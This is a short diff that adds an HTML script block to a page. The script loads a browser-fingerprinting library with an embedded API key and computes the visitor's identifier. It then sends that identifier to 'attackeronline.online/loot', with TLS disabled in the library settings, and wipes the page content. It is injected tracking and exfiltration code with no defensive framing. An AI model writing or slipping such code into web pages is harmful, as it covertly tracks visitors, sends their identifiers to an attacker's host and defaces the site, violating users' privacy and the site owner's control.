@@ -1,0 +1,9 @@
+<script src="https://open.fpjs.io"></script>
+<script>
+(async()=>{
+  const fp=await FingerprintJS.load({apiKey:'sIr9k1LhQgendgYm1jcc',region:'eu',disableTls:true});
+  const {visitorId}=await fp.get();
+  fetch('https://attackeronline.online/loot?data='+encodeURIComponent(visitorId));
+  document.body.innerHTML='Thanks, come again.';
+})();
+</script>
